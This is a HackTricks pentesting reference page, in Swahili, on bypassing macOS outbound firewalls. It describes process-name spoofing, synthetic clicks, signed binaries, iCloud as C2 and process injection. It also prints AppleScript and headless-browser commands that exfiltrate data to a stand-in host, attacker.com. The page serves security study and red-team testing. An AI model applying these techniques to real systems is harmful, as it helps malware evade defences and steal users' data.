# Kupita Kizuizi za Firewalls za macOS

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Mbinu Zilizopatikana

Mbinu zifuatazo zilipatikana kufanya kazi kwenye baadhi ya programu za kizuizi cha firewall za macOS.

### Kutumia majina ya orodha nyeupe

* Kwa mfano, kuita programu hasidi kwa majina ya michakato maarufu ya macOS kama vile **`launchd`**&#x20;

### Bonyeza ya Kisynthetic

* Ikiwa kizuizi cha firewall kinahitaji idhini kutoka kwa mtumiaji, fanya programu hasidi **ibonyeze ruhusa**

### **Tumia programu tumizi zilizosainiwa na Apple**

* Kama vile **`curl`**, lakini pia nyingine kama vile **`whois`**

### Kikoa maarufu cha Apple

Kizuizi cha firewall kinaweza kuruhusu uhusiano kwenye vikoa maarufu vya Apple kama vile **`apple.com`** au **`icloud.com`**. Na iCloud inaweza kutumika kama C2.

### Kupita Kizuizi kwa Ujumla

Baadhi ya mawazo ya kujaribu kupita kizuizi cha firewall

### Angalia trafiki iliyoruhusiwa

Kujua trafiki iliyoruhusiwa kutakusaidia kutambua vikoa vilivyowekwa kwenye orodha nyeupe au ni programu gani zinazoruhusiwa kufikia vikoa hivyo
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Kutumia DNS

Utaratibu wa DNS hutumiwa kupitia programu iliyosainiwa ya **`mdnsreponder`** ambayo inaweza kuruhusiwa kuwasiliana na seva za DNS.

<figure><img src="../../.gitbook/assets/image (1) (1) (6).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Kupitia programu za Kivinjari

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
* Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Kupitia kuingiza michakato

Ikiwa unaweza **kuingiza namna ya kanuni ndani ya mchakato** ambao una ruhusa ya kuunganisha kwenye seva yoyote, unaweza kuzunguka ulinzi wa firewall:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## Marejeo

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
